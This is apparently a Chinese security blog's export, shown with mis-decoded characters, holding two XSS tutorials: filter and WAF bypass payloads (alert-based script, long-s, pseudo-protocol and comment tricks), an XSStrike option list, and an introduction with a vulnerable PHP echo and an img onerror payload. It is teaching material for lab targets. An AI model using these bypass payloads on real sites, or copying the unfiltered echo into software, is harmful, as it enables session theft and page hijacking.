ï¼ˆ1ï¼‰ä½¿ç”¨æ¢è¡Œ&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt; ï¼ˆ2ï¼‰ä½¿ç”¨ç©ºæ ¼&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt; 12ã€å¼•ç”¨æŒ‡å®šç½‘ç«™ä¸‹çš„ç›®å½•æ–‡ä»¶function render (input) &#123; input = input.toUpperCase() //æŠŠæ‰€æœ‰çš„è¾“å‡ºå†…å®¹éƒ½å¤§å†™ return `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`&#125; &emsp;&emsp;jsæ ‡ç­¾ï¼Œsrcçš„åœ°å€ï¼Œéšä¾¿ï¼Œä½†æ˜¯jsçš„è¯­æ³•æ˜¯å¤§å°å†™æ•æ„Ÿçš„ &emsp;&emsp;å¼€å¯phpstudyï¼Œåœ¨ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªABC.JSï¼Œå†™ä¸Šä¸€æ¡alert(1);è¯­å¥ï¼Œä¿å­˜ &emsp;&emsp;payloadï¼š&lt;script src=&quot;http://127.0.0.1/ABC.JS&quot;&gt;&lt;/script&gt; 13ã€ä½¿ç”¨JSçš„æ³¨é‡Šç¬¦ï¼ˆ1ï¼‰æ³¨é‡Šç¬¦â€“&gt;&emsp;&emsp;--&gt; jsçš„æ³¨é‡Šç¬¦ï¼Œè®©åé¢çš„è¯­å¥ä¸ç”Ÿæ•ˆ function render (input) &#123; input = input.replace(/[&lt;/&quot;&#x27;]/g, &#x27;&#x27;) //è¿‡æ»¤äº†&lt; / &quot; &#x27; return ` &lt;script&gt; // alert(&#x27;$&#123;input&#125;&#x27;) æ³¨é‡Šåªèƒ½æ³¨é‡Šæ‰è¿™ä¸€è¡Œ &lt;/script&gt; `&#125;xxalert(1)--&gt; jsçš„æ³¨é‡Šç¬¦ï¼Œè®©åé¢çš„è¯­å¥ä¸ç”Ÿæ•ˆ ï¼ˆ2ï¼‰æ³¨é‡Šç¬¦//// from alf.nufunction render (s) &#123; function escapeJs (s) &#123; return String(s) .replace(/\\\\/g, &#x27;\\\\\\\\&#x27;) .replace(/&#x27;/g, &#x27;\\\\\\&#x27;&#x27;) .replace(/&quot;/g, &#x27;\\\\&quot;&#x27;) .replace(/`/g, &#x27;\\\\`&#x27;) .replace(/&lt;/g, &#x27;\\\\74&#x27;) .replace(/&gt;/g, &#x27;\\\\76&#x27;) .replace(/\\//g, &#x27;\\\\/&#x27;) .replace(/\\n/g, &#x27;\\\\n&#x27;) .replace(/\\r/g, &#x27;\\\\r&#x27;) .replace(/\\t/g, &#x27;\\\\t&#x27;) .replace(/\\f/g, &#x27;\\\\f&#x27;) .replace(/\\v/g, &#x27;\\\\v&#x27;) // .replace(/\\b/g, &#x27;\\\\b&#x27;) .replace(/\\0/g, &#x27;\\\\0&#x27;) &#125; s = escapeJs(s) return `&lt;script&gt; var url = &#x27;javascript:console.log(&quot;$&#123;s&#125;&quot;)&#x27; var a = document.createElement(&#x27;a&#x27;) a.href = url document.body.appendChild(a) a.click()&lt;/script&gt;`&#125; &emsp;&emsp;payloadï¼š&quot;);alert(1)// &emsp;&emsp;é€šè¿‡æºç å‘ç°ä¸€äº›å­—ç¬¦è¢«è½¬ä¹‰äº†ï¼Œå°±è¿æ¢è¡Œç¬¦ä¹Ÿè¢«è½¬ä¹‰äº†ã€‚ä½†æ˜¯å‘ç°ç«Ÿç„¶è¿˜å¯ä»¥ç”¨ï¼ŒåŸå› æ˜¯//è™½ç„¶è¢«è½¬ä¹‰æˆäº†//ï¼Œä½†è½¬ä¹‰ä¹‹åè¿˜æ˜¯//ï¼Œåœ¨jsä¸­è¿˜æ˜¯æ³¨é‡Šç¬¦ï¼ˆå‹¿ä¸æ­£åˆ™æ··æ·†ï¼‰ 14ã€ä½¿ç”¨å¤è‹±è¯­function render (input) &#123; input = input.replace(/&lt;([a-zA-Z])/g, &#x27;&lt;_$1&#x27;) &lt;ç¢°åˆ°å­—æ¯å°±å˜æˆ&lt;_ input = input.toUpperCase() return &#x27;&lt;h1&gt;&#x27; + input + &#x27;&lt;/h1&gt;&#x27;&#125; &emsp;&emsp;ä½¿ç”¨ç»´åŸºç™¾ç§‘æœç´¢sï¼Œä¼šå‘ç°é•¿sï¼Œå¤è‹±è¯­çš„s &emsp;&emsp;ä¸¾ä¸€åä¸‰ï¼Œç¢°åˆ°å…¶ä»–å­—æ¯æ˜¯å¦ä¹Ÿå¯ä»¥ç”¨å¤è‹±è¯­ &emsp;&emsp;payloadï¼š &lt;Å¿cript src=&#x27;http://127.0.0.1/ABC.JS&#x27;&gt;&lt;/script&gt; 15ã€ä½¿ç”¨ä¼ªåè®®&lt;a href=&quot;javascript:alert(1)&quot;&gt; ä¸‰ã€Wafé˜²æŠ¤ä¸ç»•è¿‡æ¼”ç¤º&emsp;&emsp;å°±ä½¿ç”¨xss-labsè¿™ä¸ªé¶åœºçš„ç¬¬ä¸€å…³å’ŒæŸç‹—ä½œä¸ºæ¼”ç¤º åˆ†ææ‹¦æˆªæƒ…å†µ é€šè¿‡å»é™¤å…³é”®è¯æˆ–å…³é”®è¯çš„å…¶ä¸­æŸäº›å­—æ¯åˆ¤æ–­æ‹¦æˆªäº†ä»€ä¹ˆå…³é”®è¯ï¼Œå¦‚ä¸‹æ­£å¸¸ è€Œå¦‚ä¸‹å°±ä¸æ­£å¸¸äº† å¦‚ä¸‹æ­£å¸¸ã€‚è¯´æ˜æ˜¯åŒ¹é…äº†&lt;script&gt;æ ‡ç­¾ å°è¯•å¤§å°å†™ç»•è¿‡ä¸è¡Œåï¼Œåˆ©ç”¨XSSå¹³å°ï¼Œå‘ç°åé¢&lt;/h2&gt;çš„&gt;æŠŠå‰é¢çš„ç»™åŒ…èµ·æ¥äº†ï¼Œå¯¼è‡´è®¿é—®çš„é“¾æ¥æ‹¼æ¥äº†&lt;/h2 ä½¿ç”¨å¼•å·åŒ…è£¹é“¾æ¥å³å¯ ä½¿ç”¨è¶…é“¾æ¥ä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯&lt;a href=xxx&gt;çŒœæµ‹ä¹Ÿå°±ä¼šæ£€æµ‹hrefï¼Œè€Œäº‹å®ä¹Ÿç¡®å®å¦‚æ­¤ï¼Œåªéœ€è¦åœ¨hrefå‰åŠ /å³å¯ç»•è¿‡ï¼Œä¹Ÿä¸å½±å“è¯­ä¹‰ï¼Œè€Œä¹‹æ‰€ä»¥åŠ /èƒ½ç»•è¿‡ï¼Œæ˜¯å› ä¸ºåœ¨å‰ç«¯ä¸­/ç»å¸¸å‡ºç°åœ¨é—­åˆçš„åæ ‡ç­¾ï¼ŒåŠ ä¸Šåå°±ä¼šè®©wafè¯¯ä»¥ä¸ºæ˜¯ç»“æŸæ ‡ç­¾ å››ã€å¸¸è§„Wafç»•è¿‡æ€è·¯[+] æ ‡ç­¾è¯­æ³•æ›¿æ¢[+] ç‰¹æ®Šç¬¦å·å¹²æ‰° æ¯”å¦‚ / #[+] æäº¤æ–¹å¼æ›´æ”¹ Requestçš„å‰æä¸‹ï¼ŒWafåªæ£€æŸ¥URLå†…å®¹è€Œä¸æ£€æŸ¥POSTå†…å®¹[+] åƒåœ¾æ•°æ®æº¢å‡º [+] åŠ å¯†è§£å¯†ç®—æ³•[+] ç»“åˆå…¶ä»–æ¼æ´ç»•è¿‡ äº”ã€XSSè‡ªåŠ¨åŒ–å·¥å…·1ã€Xwaf&emsp;&emsp;ä¸‹è½½é“¾æ¥ï¼šhttps://github.com/3xp10it/xwaf &emsp;&emsp;ç°åœ¨ä½œè€…è²Œä¼¼ä¸å†ç»´æŠ¤è¯¥é¡¹ç›®äº† 2ã€XSStrike&emsp;&emsp;ä¸‹è½½é“¾æ¥ï¼šhttps://github.com/s0md3v/XSStrike XSStrike ä¸»è¦ç‰¹ç‚¹ï¼š[+] åå°„å’Œ DOM XSS æ‰«æ[+] å¤šçº¿ç¨‹çˆ¬è™«[+] Context åˆ†æ[+] å¯é…ç½®çš„æ ¸å¿ƒ[+] æ£€æµ‹å’Œè§„é¿ WAF[+] è€æ—§çš„ JS åº“æ‰«æ[+] æ™ºèƒ½ payload ç”Ÿæˆå™¨[+] æ‰‹å·¥åˆ¶ä½œçš„ HTML &amp; JavaScript è§£æå™¨[+] å¼ºå¤§çš„ fuzzing å¼•æ“[+] ç›²æ‰“ XSS æ”¯æŒ[+] é«˜æ•ˆçš„å·¥ä½œæµ[+] å®Œæ•´çš„ HTTP æ”¯æŒ[+] Bruteforce payloads æ”¯æŒ[+] Payload ç¼–ç  &emsp;&emsp;ç›¸å…³å‚æ•° -h, --help //æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯-u, --url //æŒ‡å®šç›®æ ‡ URL--data //POST æ–¹å¼æäº¤å†…å®¹-v, --verbose //è¯¦ç»†è¾“å‡º-f, --file //åŠ è½½è‡ªå®šä¹‰ paload å­—å…¸-t, --threads //å®šä¹‰çº¿ç¨‹æ•°-l, --level //çˆ¬è¡Œæ·±åº¦-t, --encode //å®šä¹‰ payload ç¼–ç æ–¹å¼--json //å°† POST æ•°æ®è§†ä¸º JSON--path //æµ‹è¯• URL è·¯å¾„ç»„ä»¶--seeds //ä»æ–‡ä»¶ä¸­æµ‹è¯•ã€æŠ“å– URL--fuzzer //æµ‹è¯•è¿‡æ»¤å™¨å’Œ Web åº”ç”¨ç¨‹åºé˜²ç«å¢™ã€‚--update //æ›´æ–°--timeout //è®¾ç½®è¶…æ—¶æ—¶é—´--params //æŒ‡å®šå‚æ•°--crawl //çˆ¬è¡Œ--proxy //ä½¿ç”¨ä»£ç†--blind //ç›²æµ‹è¯•--skip //è·³è¿‡ç¡®è®¤æç¤º--skip-dom //è·³è¿‡ DOM æ‰«æ--headers //æä¾› HTTP æ ‡å¤´-d, --delay //è®¾ç½®å»¶è¿Ÿ å…­ã€Fuzzingæµ‹è¯• åœ¨çº¿ç”ŸæˆFuzzingå­—å…¸ï¼šXSS Fuzzer Fuzzingå­—å…¸ï¼šhttps://github.com/TheKingOfDuck/fuzzDicts ä¸ƒã€XSSï¼ˆå¸¦è¿‡æ»¤ï¼‰é¶åœºå®æˆ˜ Xss-labs Xssé¶åœºé€šå…³ Java Xssæµ‹è¯•å¹³å°","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"XSS","slug":"XSS","permalink":"https://wolke.cn/tags/XSS/"}],"author":"w01ke"},{"title":"è·¨ç«™è„šæœ¬æ”»å‡»XSS","slug":"è·¨ç«™è„šæœ¬æ”»å‡»XSS","date":"2022-01-30T14:45:22.000Z","updated":"2022-01-30T16:37:11.878Z","comments":true,"path":"post/e0b257ee.html","link":"","permalink":"https://wolke.cn/post/e0b257ee.html","excerpt":"","text":"ä¸€ã€XSSè·¨ç«™æ¼æ´ï¼ˆ1ï¼‰XSSç®€ä»‹&emsp;&emsp;ç½‘ç«™ä¸­åŒ…å«å¤§é‡çš„åŠ¨æ€å†…å®¹ä»¥æé«˜ç”¨æˆ·ä½“éªŒï¼Œæ¯”è¿‡å»è¦å¤æ‚å¾—å¤šã€‚æ‰€è°“åŠ¨æ€å†…å®¹ï¼Œå°±æ˜¯æ ¹æ®ç”¨æˆ·ç¯å¢ƒå’Œéœ€è¦ï¼ŒWebåº”ç”¨ç¨‹åºèƒ½å¤Ÿè¾“å‡ºç›¸åº”çš„å†…å®¹ã€‚åŠ¨æ€ç«™ç‚¹ä¼šå—åˆ°ä¸€ç§åä¸ºâ€œè·¨ç«™è„šæœ¬æ”»å‡»â€ï¼ˆCross Site Scriptingï¼Œå®‰å…¨ä¸“å®¶ä»¬é€šå¸¸å°†å…¶ç¼©å†™æˆXSS,åŸæœ¬åº”å½“æ˜¯cssï¼Œä½†ä¸ºäº†å’Œå±‚å æ ·å¼è¡¨ï¼ˆCascading Style Sheet,CSSï¼‰æœ‰æ‰€åŒºåˆ†ï¼Œæ•…ç§°XSSï¼‰çš„å¨èƒï¼Œè€Œé™æ€ç«™ç‚¹åˆ™å®Œå…¨ä¸å—å…¶å½±å“ã€‚æ¶æ„æ”»å‡»è€…ä¼šåœ¨ Webé¡µé¢é‡Œæ’å…¥æ¶æ„Scriptä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­Webé‡Œé¢çš„Scriptä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚ &emsp;&emsp;è·¨ç«™è„šæœ¬æ”»å‡»æ˜¯ä¸€ç§é’ˆå¯¹ç½‘ç«™åº”ç”¨ç¨‹åºçš„å®‰å…¨æ¼æ´æ”»å‡»æŠ€æœ¯ï¼Œæ˜¯ä»£ç æ³¨å…¥çš„ä¸€ç§ã€‚å®ƒå…è®¸æ¶æ„ç”¨æˆ·å°†ä»£ç æ³¨å…¥ç½‘é¡µï¼Œå…¶ä»–ç”¨æˆ·åœ¨æµè§ˆç½‘é¡µæ—¶ä¼šå—åˆ°å½±å“ï¼Œæ¶æ„ç”¨æˆ·åˆ©ç”¨xss ä»£ç æ”»å‡»æˆåŠŸåï¼Œå¯èƒ½å¾—åˆ°å¾ˆé«˜çš„æƒé™ã€ç§å¯†ç½‘é¡µå†…å®¹ã€ä¼šè¯å’Œcookieç­‰å„ç§å†…å®¹ &emsp;&emsp;æ”»å‡»è€…åˆ©ç”¨XSSæ¼æ´æ—è·¯æ‰è®¿é—®æ§åˆ¶â€”â€”ä¾‹å¦‚åŒæºç­–ç•¥(same origin policy)ã€‚è¿™ç§ç±»å‹çš„æ¼æ´ç”±äºè¢«é»‘å®¢ç”¨æ¥ç¼–å†™å±å®³æ€§æ›´å¤§çš„ç½‘ç»œé’“é±¼(Phishing)æ”»å‡»è€Œå˜å¾—å¹¿ä¸ºäººçŸ¥ã€‚å¯¹äºè·¨ç«™è„šæœ¬æ”»å‡»ï¼Œé»‘å®¢ç•Œå…±è¯†æ˜¯ï¼šè·¨ç«™è„šæœ¬æ”»å‡»æ˜¯æ–°å‹çš„â€œç¼“å†²åŒºæº¢å‡ºæ”»å‡»â€ï¼Œè€ŒJavaScriptæ˜¯æ–°å‹çš„â€œShellCodeâ€ã€‚ &emsp;&emsp;xssæ¼æ´é€šå¸¸æ˜¯é€šè¿‡phpçš„è¾“å‡ºå‡½æ•°å°†javascriptä»£ç è¾“å‡ºåˆ°htmlé¡µé¢ä¸­ï¼Œé€šè¿‡ç”¨æˆ·æœ¬åœ°æµè§ˆå™¨æ‰§è¡Œçš„ï¼Œæ‰€ä»¥xssæ¼æ´å…³é”®å°±æ˜¯å¯»æ‰¾å‚æ•°æœªè¿‡æ»¤çš„è¾“å‡ºå‡½æ•°ã€‚ &lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt; ï¼ˆ2ï¼‰äº§ç”Ÿå±‚é¢&emsp;&emsp;äº§ç”Ÿå±‚é¢ä¸€èˆ¬éƒ½æ˜¯åœ¨å‰ç«¯ï¼ŒJavaScriptä»£ç èƒ½å¹²ä»€ä¹ˆï¼Œæ‰§è¡Œä¹‹åå°±ä¼šè¾¾åˆ°ç›¸åº”çš„æ•ˆæœ ï¼ˆ3ï¼‰å‡½æ•°ç±»&emsp;&emsp;æ¯”å¦‚è¯´phpä¸­çš„è„šæœ¬çš„è¾“å‡ºå‡½æ•° &emsp;&emsp;å¸¸è§çš„è¾“å‡ºå‡½æ•°æœ‰ï¼šprintã€print_rã€echoã€printfã€sprintfã€dieã€var_dumpã€var_export ï¼ˆ4ï¼‰å±å®³å½±å“ ç›—å–å„ç±»ç”¨æˆ·å¸å·ï¼Œå¦‚æœºå™¨ç™»å½•å¸å·ã€ç”¨æˆ·ç½‘é“¶å¸å·ã€å„ç±»ç®¡ç†å‘˜å¸å· æ§åˆ¶ä¼ä¸šæ•°æ®ï¼ŒåŒ…æ‹¬è¯»å–ã€ç¯¡æ”¹ã€æ·»åŠ ã€åˆ é™¤ä¼ä¸šæ•æ„Ÿæ•°æ®çš„èƒ½åŠ› ç›—çªƒä¼ä¸šé‡è¦çš„å…·æœ‰å•†ä¸šä»·å€¼çš„èµ„æ–™ éæ³•è½¬è´¦ å¼ºåˆ¶å‘é€ç”µå­é‚®ä»¶ ç½‘ç«™æŒ‚é©¬ æ§åˆ¶å—å®³è€…æœºå™¨å‘å…¶å®ƒç½‘ç«™å‘èµ·æ”»å‡» &emsp;&emsp;å…¶å®å½’æ ¹ç»“åº•ï¼ŒXSSçš„æ”»å‡»æ–¹å¼å°±æ˜¯æƒ³åŠæ³•â€œæ•™å”†â€ç”¨æˆ·çš„æµè§ˆå™¨å»æ‰§è¡Œä¸€äº›è¿™ä¸ªç½‘é¡µä¸­åŸæœ¬ä¸å­˜åœ¨çš„å‰ç«¯ä»£ç ã€‚å¯é—®é¢˜åœ¨äºå°½ç®¡ä¸€ä¸ªä¿¡æ¯æ¡†çªç„¶å¼¹å‡ºæ¥å¹¶ä¸æ€ä¹ˆå‹å¥½ï¼Œä½†ä¹Ÿä¸è‡³äºä¼šé€ æˆä»€ä¹ˆçœŸå®ä¼¤å®³å•Šã€‚çš„ç¡®å¦‚æ­¤ï¼Œä½†è¦è¯´æ˜çš„æ˜¯ï¼Œè¿™é‡Œæ‹¿ä¿¡æ¯æ¡†è¯´äº‹ä»…ä»…æ˜¯ä¸ºäº†ä¸¾ä¸ªæ —å­ï¼ŒçœŸæ­£çš„é»‘å®¢æ”»å‡»åœ¨XSSä¸­é™¤éæ¶ä½œå‰§ï¼Œä¸ç„¶æ˜¯ä¸ä¼šåœ¨æ¶æ„æ¤å…¥ä»£ç ä¸­å†™ä¸Šalert(&quot;say something&quot;)çš„ã€‚åœ¨çœŸæ­£çš„åº”ç”¨ä¸­ï¼ŒXSSæ”»å‡»å¯ä»¥å¹²çš„äº‹æƒ…è¿˜æœ‰å¾ˆå¤šï¼Œè¿™é‡Œä¸¾ä¸¤ä¸ªä¾‹å­ã€‚ çªƒå–ç½‘é¡µæµè§ˆä¸­çš„cookieå€¼ã€‚åœ¨ç½‘é¡µæµè§ˆä¸­æˆ‘ä»¬å¸¸å¸¸æ¶‰åŠåˆ°ç”¨æˆ·ç™»å½•ï¼Œç™»å½•å®Œæ¯•ä¹‹åæœåŠ¡ç«¯ä¼šè¿”å›ä¸€ä¸ªcookieå€¼ã€‚è¿™ä¸ªcookieå€¼ç›¸å½“äºä¸€ä¸ªä»¤ç‰Œï¼Œæ‹¿ç€è¿™å¼ ä»¤ç‰Œå°±ç­‰åŒäºè¯æ˜äº†ä½ æ˜¯æŸä¸ªç”¨æˆ·ã€‚å¦‚æœä½ çš„cookieå€¼è¢«çªƒå–ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¾ˆå¯èƒ½èƒ½å¤Ÿç›´æ¥åˆ©ç”¨ä½ çš„è¿™å¼ ä»¤ç‰Œä¸ç”¨å¯†ç å°±ç™»å½•ä½ çš„è´¦æˆ·ã€‚å¦‚æœæƒ³è¦é€šè¿‡scriptè„šæœ¬è·å¾—å½“å‰é¡µé¢çš„cookieå€¼ï¼Œé€šå¸¸ä¼šç”¨åˆ°cookieã€‚è¯•æƒ³ä¸‹å¦‚æœåƒç©ºé—´è¯´è¯´ä¸­èƒ½å¤Ÿå†™å…¥xssæ”»å‡»è¯­å¥ï¼Œé‚£å²‚ä¸æ˜¯çœ‹äº†ä½ è¯´è¯´çš„äººçš„å·ä½ éƒ½å¯ä»¥ç™»å½•ï¼ˆä¸è¿‡è²Œä¼¼QQçš„cookieæœ‰å…¶ä»–éªŒè¯æªæ–½ä¿è¯åŒä¸€cookieä¸èƒ½è¢«æ»¥ç”¨ï¼‰ åŠ«æŒæµé‡å®ç°æ¶æ„è·³è½¬ã€‚è¿™ä¸ªå¾ˆç®€å•ï¼Œå°±æ˜¯åœ¨ç½‘é¡µä¸­æƒ³åŠæ³•æ’å…¥ä¸€å¥åƒè¿™æ ·çš„è¯­å¥ï¼š &lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;;&lt;/script&gt;é‚£ä¹ˆæ‰€è®¿é—®çš„ç½‘ç«™å°±ä¼šè¢«è·³è½¬åˆ°ç™¾åº¦çš„é¦–é¡µã€‚æ—©åœ¨2011å¹´æ–°æµªå°±æ›¾çˆ†å‡ºè¿‡ä¸¥é‡çš„xssæ¼æ´ï¼Œå¯¼è‡´å¤§é‡ç”¨æˆ·è‡ªåŠ¨å…³æ³¨æŸä¸ªå¾®åšå·å¹¶è‡ªåŠ¨è½¬å‘æŸæ¡å¾®åšã€‚å…·ä½“å„ä½å¯ä»¥è‡ªè¡Œç™¾åº¦ã€‚ ï¼ˆ5ï¼‰æµè§ˆå™¨å†…æ ¸ç‰ˆæœ¬&emsp;&emsp;åˆ©ç”¨XSSéœ€è¦æµè§ˆå™¨ç‰ˆæœ¬å’Œå†…æ ¸æ²¡æœ‰è¿‡æ»¤XSSæ”»å‡»ï¼ˆæ¯”å¦‚ç”¨è°·æ­ŒEdgeç«ç‹ç­‰æ‰“å¼€å¯ä»¥æˆåŠŸï¼Œä½†æ˜¯IEå´ä¼šæ‹¦æˆªï¼‰ ï¼ˆ6ï¼‰å¸¸å‡ºç°åœºæ™¯&emsp;&emsp;æ–‡ç« å‘è¡¨ã€è¯„è®ºã€ç•™è¨€ã€æ³¨å†Œèµ„æ–™çš„åœ°æ–¹ã€ä¿®æ”¹èµ„æ–™çš„åœ°æ–¹ç­‰ äºŒã€XSSæ”»å‡»çš„åˆ†ç±»&emsp;&emsp;XSSæ”»å‡»åˆ†æˆä¸¤ç±»ï¼Œä¸€ç±»æ˜¯æ¥è‡ªå†…éƒ¨çš„æ”»å‡»ï¼Œå¦ä¸€ç±»åˆ™æ˜¯æ¥è‡ªå¤–éƒ¨çš„æ”»å‡» ï¼ˆ1ï¼‰æ¥è‡ªå†…éƒ¨çš„æ”»å‡»&emsp;&emsp;ä¸»è¦æŒ‡çš„æ˜¯åˆ©ç”¨ç¨‹åºè‡ªèº«çš„æ¼æ´ï¼Œæ„é€ è·¨ç«™è¯­å¥ï¼Œå¦‚:dvbbsçš„showerror.aspå­˜åœ¨çš„è·¨ç«™æ¼æ´ã€‚ ï¼ˆ2ï¼‰æ¥è‡ªå¤–éƒ¨çš„æ”»å‡»&emsp;&emsp;ä¸»è¦æŒ‡çš„è‡ªå·±æ„é€ XSSè·¨ç«™æ¼æ´ç½‘é¡µæˆ–è€…å¯»æ‰¾éç›®æ ‡æœºä»¥å¤–çš„æœ‰è·¨ç«™æ¼æ´çš„ç½‘é¡µã€‚å¦‚å½“æˆ‘ä»¬è¦æ¸—é€ä¸€ä¸ªç«™ç‚¹ï¼Œæˆ‘ä»¬è‡ªå·±æ„é€ ä¸€ä¸ªæœ‰è·¨ç«™æ¼æ´çš„ç½‘é¡µï¼Œç„¶åæ„é€ è·¨ç«™è¯­å¥ï¼Œé€šè¿‡ç»“åˆå…¶å®ƒæŠ€æœ¯ï¼Œå¦‚ç¤¾ä¼šå·¥ç¨‹å­¦ç­‰ï¼Œæ¬ºéª—ç›®æ ‡æœåŠ¡å™¨çš„ç®¡ç†å‘˜æ‰“å¼€ã€‚ ä¸‰ã€XSSçš„åˆ†ç±»1ã€åå°„å‹(éæŒä¹…åŒ–)ï¼ˆ1ï¼‰åŸç†&emsp;&emsp;åå°„å‹xssåˆç§°éæŒä¹…å‹xssï¼Œæ˜¯ç›®å‰æœ€æ™®éçš„ç±»å‹ï¼Œè¿™ç§æ”»å‡»æ–¹å¼å¾€å¾€å…·æœ‰ä¸€æ¬¡æ€§ã€‚å‘å‡ºè¯·æ±‚æ—¶ï¼ŒXSSä»£ç å‡ºç°åœ¨URLä¸­ï¼Œä½œä¸ºè¾“å…¥æäº¤åˆ°æœåŠ¡å™¨ç«¯ï¼ŒæœåŠ¡å™¨ç«¯è§£æåå“åº”ï¼ŒXSSä»£ç éšå“åº”å†…å®¹ä¸€èµ·ä¼ å›ç»™æµè§ˆå™¨ï¼Œæœ€åæµè§ˆå™¨è§£ææ‰§è¡ŒXSSä»£ç ã€‚è¿™ä¸ªè¿‡ç¨‹åƒä¸€æ¬¡åå°„ï¼Œæ‰€ä»¥ç§°åå°„å‹XSSã€‚ ï¼ˆ2ï¼‰æ”»å‡»æ–¹å¼&emsp;&emsp;æ”»å‡»è€…é€šè¿‡ç”µå­é‚®ä»¶ç­‰æ–¹å¼å°†åŒ…å«xssä»£ç çš„æ¶æ„é“¾æ¥å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚å½“ç›®æ ‡ç”¨æˆ·è®¿é—®è¯¥é“¾æ¥æ—¶ï¼ŒæœåŠ¡å™¨æ¥å—è¯¥ç”¨æˆ·çš„è¯·æ±‚å¹¶è¿›è¡Œå¤„ç†ï¼Œç„¶åæœåŠ¡å™¨æŠŠå¸¦æœ‰xssä»£ç çš„æ•°æ®å‘é€ç»™ç›®æ ‡ç”¨æˆ·çš„æµè§ˆå™¨ï¼Œæµè§ˆå™¨è§£æè¿™æ®µå¸¦æœ‰xssä»£ç çš„æ¶æ„è„šæœ¬åå°±ä¼šè§¦å‘xssæ¼æ´ ï¼ˆ3ï¼‰åˆ¤æ–­æ˜¯å¦å­˜åœ¨åå°„å‹xssæ¼æ´å¹¶åˆ©ç”¨â‘  åˆ¤æ–­æœ‰æ²¡æœ‰è¿‡æ»¤ä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦&emsp;&emsp;æ¯”å¦‚å¯¹æ¯”è¾“å‡ºçš„å­—ç¬¦å’Œè¾“å‡ºçš„å­—ç¬¦ï¼Œå¯ä»¥çœ‹åˆ°æœ‰äº›å­—ç¬¦è¢«è¿‡æ»¤äº† â‘¡ æ³¨å…¥ä»£ç &emsp;&emsp;ä¸‹é¢æ˜¯å¤§æ¦‚çš„åŸç† &emsp;&emsp;å‡å¦‚æˆ‘è¾“å…¥çš„æ˜¯1ï¼Œæäº¤åï¼Œç‚¹å‡»æŸ¥çœ‹ç½‘é¡µæºä»£ç  â‘¢ æ’å…¥ä»£ç &emsp;&emsp;&quot;&gt;&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt; #å¦‚æœè¯»å–å›¾ç‰‡å¤±è´¥ï¼Œåˆ™ç”¨alertæ˜¾ç¤ºç›¸å…³ä¿¡æ¯ &emsp;&emsp;æ˜¾ç¤ºäº†ä¿¡æ¯ï¼Œåˆ™è¯´æ˜å­˜åœ¨xssæ³¨å…¥ &emsp;&emsp;å¯ä»¥å¯¹æ¯”çœ‹åˆ°ï¼Œé€šè¿‡å‰é¢çš„é—­åˆä»¥åŠåé¢çš„ä»£ç æ’å…¥ï¼Œè¯»å–ä¸åˆ°å›¾ç‰‡ï¼Œå› æ­¤è§¦å‘äº†alertå¼¹çª—ï¼Œæ˜¾ç¤ºäº†æ‹¬å·å†…çš„å†…å®¹å³/xss/ â‘£ åˆ©ç”¨xssæ¼æ´&emsp;&emsp;å°†åˆšåˆšæˆåŠŸæ³¨å…¥ä»£ç å¹¶èƒ½è§¦å‘xssçš„ç½‘å€é€šè¿‡ç”µå­é‚®ä»¶ç­‰æ–¹å¼å‘é€ç»™å¯¹æ–¹çš„æ‰‹ä¸­ï¼Œå¦‚æœç»“åˆxsså¹³å°ï¼Œå¯¹æ–¹ç‚¹å‡»äº†é“¾æ¥ï¼Œå°±èƒ½å¾—åˆ°å¯¹æ–¹çš„cookieç­‰ä¿¡æ¯ 2ã€å­˜å‚¨å‹(æŒä¹…åŒ–) ï¼ˆ1ï¼‰åŸç†&emsp;&emsp;å­˜å‚¨å‹XSSå’Œåå°„å‹XSSçš„å·®åˆ«ä»…åœ¨äºï¼Œæäº¤çš„ä»£ç ä¼šå­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼ˆæ•°æ®åº“ã€å†…å­˜ã€æ–‡ä»¶ç³»ç»Ÿç­‰ï¼‰ï¼Œä¸‹æ¬¡è¯·æ±‚ç›®æ ‡é¡µé¢æ—¶ä¸ç”¨å†æäº¤XSSä»£ç ã€‚æœ€å…¸å‹çš„ä¾‹å­å°±æ˜¯ç•™è¨€æ¿XSSï¼Œç”¨æˆ·æäº¤ä¸€æ¡åŒ…å«XSSä»£ç çš„ç•™è¨€å­˜å‚¨åˆ°æ•°æ®åº“ï¼Œç›®æ ‡ç”¨æˆ·æŸ¥çœ‹ç•™è¨€æ¿æ—¶ï¼Œé‚£äº›ç•™è¨€å°±ä¼šä»æ•°æ®åº“ä¸­åŠ è½½å‡ºæ¥å¹¶æ˜¾ç¤ºï¼Œäºæ˜¯è§¦å‘äº†XSSæ”»å‡» 